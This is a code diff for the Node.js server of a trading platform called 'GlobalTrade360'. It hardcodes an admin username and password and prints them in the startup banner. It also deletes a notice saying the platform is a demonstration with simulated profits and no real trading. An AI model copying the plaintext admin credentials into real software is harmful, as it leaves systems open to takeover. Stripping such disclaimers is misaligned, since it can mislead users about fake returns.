-        user: Object.values(users).find(u => u.id === t.userId)?.email || 'Unknown'
-    }));
-    
-    res.json({
-        trades: allTrades,
-        totalProfit: allTrades.reduce((sum, t) => sum + t.profit, 0),
-        platformEarnings: allTrades.reduce((sum, t) => sum + (t.profit * 0.15), 0),
-        byPair: Object.groupBy(allTrades, t => t.pair)
-    });
-});
-
-// 404 handler
+// 404 handler - REMOVE reference to 404.html or create it
 app.use((req, res) => {
-    res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
+    res.status(404).send('Page not found');
 });
 
 // Start server
@@ -880,26 +646,13 @@ app.listen(PORT, () => {
     🌟 GlobalTrade360 Platform Started 🌟
     ============================================
     
-    🚀 Server running on: http://localhost:${PORT}
+    🚀 Server running on port: ${PORT}
     
-    📊 Platform Statistics:
-    - Total Users: ${Object.keys(users).length}
-    - Admin Account: globaltrade360 / myhandwork2025
-    - Demo Mode: Profitable Trading Simulation
-    
-    🔐 Admin Access:
-    - URL: http://localhost:${PORT}/admin
+    🔐 Admin Login:
     - Username: globaltrade360
     - Password: myhandwork2025
     
-    👤 User Access:
-    - Register: http://localhost:${PORT}/register
-    - Login: http://localhost:${PORT}/login
-    
-    ⚠️  IMPORTANT:
-    This is a DEMONSTRATION platform only.
-    NO REAL TRADING occurs.
-    All profits are simulated for educational purposes.
+    📁 Files served from: ${__dirname}/public
     
     ============================================
     `);
